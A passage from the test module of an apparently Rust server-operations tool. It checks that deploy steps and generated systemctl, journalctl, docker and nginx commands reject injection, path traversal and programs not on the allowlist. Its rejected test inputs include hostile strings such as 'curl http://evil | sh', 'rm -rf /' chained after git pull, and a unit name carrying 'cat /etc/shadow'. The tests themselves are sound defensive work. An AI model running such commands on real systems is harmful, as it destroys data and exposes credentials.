        assert!(validate_deploy_step("systemctl restart app", root).is_ok());
        assert!(validate_deploy_step("mkdir -p /var/www/app/tmp", root).is_ok());
    }

    #[test]
    fn rejects_chained_or_substituted_steps() {
        let root = "/var/www/app";
        assert!(validate_deploy_step("git pull; rm -rf /", root).is_err());
        assert!(validate_deploy_step("git pull && rm -rf /", root).is_err());
        assert!(validate_deploy_step("git pull | sh", root).is_err());
        assert!(validate_deploy_step("echo $(id)", root).is_err());
        assert!(validate_deploy_step("echo `id`", root).is_err());
        assert!(validate_deploy_step("echo $HOME", root).is_err());
    }

    #[test]
    fn rejects_programs_outside_the_allowlist() {
        let root = "/var/www/app";
        assert!(validate_deploy_step("curl http://evil | sh", root).is_err());
        assert!(validate_deploy_step("wget http://evil", root).is_err());
        assert!(validate_deploy_step("bash script.sh", root).is_err());
        assert!(validate_deploy_step("chmod 777 /etc", root).is_err());
    }

    #[test]
    fn deploy_steps_cannot_reach_outside_the_project() {
        let root = "/var/www/app";
        assert!(validate_deploy_step("rm -rf /var/log", root).is_err());
        assert!(validate_deploy_step("cp -r /etc .", root).is_err());
        assert!(validate_deploy_step("rm -rf ../other", root).is_err());
        // Relative paths stay where the shell is, which is the project dir.
        assert!(validate_deploy_step("rm -rf dist", root).is_ok());
    }

    #[test]
    fn rejects_empty_or_oversized_steps() {
        let root = "/var/www/app";
        assert!(validate_deploy_step("   ", root).is_err());
        assert!(validate_deploy_step(&"npm run ".repeat(200), root).is_err());
    }

    // -- capability → command ------------------------------------------------

    #[test]
    fn service_actions_end_option_parsing() {
        let command = Capability::ServiceAction {
            action: ServiceAction::Restart,
            unit: "nginx.service".to_string(),
        }
        .command()
        .unwrap();
        assert_eq!(command, "systemctl restart -- 'nginx.service'");
    }

    #[test]
    fn a_hostile_unit_never_becomes_a_command() {
        let result = Capability::ServiceAction {
            action: ServiceAction::Start,
            unit: "nginx.service; cat /etc/shadow".to_string(),
        }
        .command();
        assert!(result.is_err(), "恶意单元名必须被拒绝，而不是拼进命令");
    }

    #[test]
    fn service_status_places_options_before_the_unit() {
        let command = Capability::ServiceStatus {
            unit: "nginx.service".to_string(),
        }
        .command()
        .unwrap();
        assert_eq!(command, "systemctl --no-pager status -- 'nginx.service'");
    }

    #[test]
    fn journal_scopes_to_one_unit() {
        let command = Capability::Journal {
            unit: Some("ssh.service".to_string()),
            lines: 200,
            priority: None,
        }
        .command()
        .unwrap();
        assert_eq!(
            command,
            "journalctl -u 'ssh.service' -n 200 --no-pager -o json"
        );
    }

    #[test]
    fn journal_filters_by_priority() {
        let command = Capability::Journal {
            unit: None,
            lines: 500,
            priority: Some(3),
        }
        .command()
        .unwrap();
        assert_eq!(command, "journalctl -n 500 --no-pager -o json -p 3");

        let result = Capability::Journal {
            unit: None,
            lines: 500,
            priority: Some(9),
        }
        .command();
        assert!(result.is_err());
    }

    #[test]
    fn docker_remove_forces_the_container() {
        let command = Capability::ContainerAction {
            action: ContainerAction::Remove,
            container: "web".to_string(),
        }
        .command()
        .unwrap();
        assert_eq!(command, "docker rm -f -- 'web'");
    }

    #[test]
    fn docker_logs_rejects_an_option_shaped_name() {
        let result = Capability::DockerLogs {
            container: "--all".to_string(),
            lines: 100,
        }
        .command();
        assert!(result.is_err());
    }

    #[test]
    fn nginx_write_paths_are_confined() {
        let result = Capability::NginxBackup {
            path: "/etc/shadow".to_string(),
        }
        .command();
        assert!(result.is_err());

        let command = Capability::NginxBackup {
            path: "/etc/nginx/nginx.conf".to_string(),
        }
        .command()
        .unwrap();
        assert_eq!(
            command,
            "cp -- '/etc/nginx/nginx.conf' '/etc/nginx/nginx.conf.blsops.bak'"
        );
    }

    #[test]
    fn enabling_a_site_uses_a_symlink() {
        let command = Capability::NginxSetSiteEnabled {
            site: "app".to_string(),
            enable: true,
        }
        .command()
        .unwrap();
        assert_eq!(
            command,
            "ln -sfn /etc/nginx/sites-available/'app' /etc/nginx/sites-enabled/'app'"
        );
    }

    #[test]
    fn disabling_a_site_removes_only_that_link() {
        let command = Capability::NginxSetSiteEnabled {
            site: "app".to_string(),
            enable: false,
        }
        .command()
        .unwrap();
        assert_eq!(command, "rm -f -- /etc/nginx/sites-enabled/'app'");
    }

    #[test]
    fn a_site_name_cannot_escape_its_directory() {
        let result = Capability::NginxSetSiteEnabled {
            site: "../../../etc".to_string(),
            enable: true,
        }
        .command();
        // `..` is not in the safe character set, so this is rejected outright.
        assert!(result.is_err());
    }

    #[test]
    fn deploy_steps_are_validated_against_their_root() {
        let ok = Capability::DeployStep {
            step: "git pull --ff-only".to_string(),
            root: "/var/www/app".to_string(),
        }
        .command();
        assert!(ok.is_ok());

        let bad = Capability::DeployStep {
            step: "rm -rf /var/log".to_string(),
            root: "/var/www/app".to_string(),
        }
        .command();
        assert!(bad.is_err());
    }

    #[test]
    fn timeouts_grow_for_slow_actions() {
        assert_eq!(Capability::ListServices.timeout(), remote::DEFAULT_TIMEOUT);
        assert!(
            Capability::DeployStep {
                step: "npm run build".to_string(),
                root: "/srv/app".to_string(),
            }
            .timeout()
            .as_secs()
                > 60
        );
    }

    use crate::remote;
}
